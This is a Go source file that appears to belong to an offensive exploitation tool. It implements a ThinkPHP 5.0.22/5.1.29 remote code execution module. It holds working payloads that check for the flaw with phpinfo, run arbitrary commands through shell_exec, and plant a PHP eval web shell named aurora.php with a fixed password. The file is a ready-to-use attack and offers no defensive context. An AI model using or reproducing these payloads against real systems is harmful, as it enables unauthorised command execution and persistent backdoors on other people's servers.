package thinkphp

import (
	"breach/internal/util"
	"io"
	"net/http"
	"strings"
)

type TP50225129Module struct {
	BaseUrl            string
	moduleList         []string
	checkVulPayloadUrl []string
	currentModule      string
	feature            string
	checkStr           string
}

func (t *TP50225129Module) CheckVul() *util.Response {
	for _, s := range t.moduleList {
		resp, err := http.Get(t.BaseUrl + "/?=/" + s)
		if err != nil {
			return util.Fail(err.Error())
		}
		if resp.StatusCode == 200 {
			t.currentModule = s
			break
		}
	}
	if t.currentModule == "" {
		return util.Fail("no vulnerable")
	}
	for _, payloadUrl := range t.checkVulPayloadUrl {
		resp, err := http.Get(t.BaseUrl + "/?s=/" + t.currentModule + payloadUrl)
		if err != nil {
			return util.Fail(err.Error())
		}
		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		if strings.Contains(string(bytes), t.checkStr) {
			return util.Success(t.feature, t.BaseUrl+"/?s=/"+t.currentModule+payloadUrl)
		}
	}
	return util.Fail("no vulnerable")
}

func (t *TP50225129Module) ExecVul(cmd string) *util.Response {
	payloadUrl := t.BaseUrl + "/?s=/" + t.currentModule + "/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=" + cmd
	resp, err := http.Get(payloadUrl)
	if err != nil {
		return util.Fail(err.Error())
	}
	bytes, err := io.ReadAll(resp.Body)
	return util.Success("success", string(bytes))
}

func (t *TP50225129Module) GetShell() *util.Response {
	payloadUrls := []string{
		"/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=aurora.php&vars[1][]=<?php%20@eval($_POST[%27aurora%27])?>",
		"/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=aurora.php&vars[1][1]=<?php /*1111*//***/file_put_contents/*1**/(/***/'aurora.php'/**/,'/***/<?php%20@eval($_POST[%27aurora%27])?>/***/')/**/;/**/?>",
		"/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][0]='<?php%20@eval($_POST[%27aurora%27])?>'&vars[1][1]=aurora.php",
		"/\\think\\template\\driver\\file/write&cacheFile=aurora.php&content=<?php%20@eval($_POST[%27aurora%27])?>",
	}
	for _, payloadUrl := range payloadUrls {
		resp, err := http.Get(t.BaseUrl + "/?s=/" + t.currentModule + payloadUrl)
		if err != nil {
			return util.Fail(err.Error())
		}
		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		if strings.Contains(string(bytes), t.checkStr) {
			return util.Success("success", t.BaseUrl+"/aurora.php   Pass:aurora")
		}
	}
	return util.Fail("no vulnerable")
}

func NewTP50225129Module(baseUrl string) *TP50225129Module {
	return &TP50225129Module{
		BaseUrl:       baseUrl,
		moduleList:    []string{"manage", "admin", "api"},
		currentModule: "",
		feature:       "ThinkPHP 5.0.22/5.1.29 RCE",
		checkStr:      "PHP Version",
		checkVulPayloadUrl: []string{
			"/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
			"/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
			"/\\think\\view\\driver\\php/display&content=<?php%20phpinfo();?>",
		},
	}
}
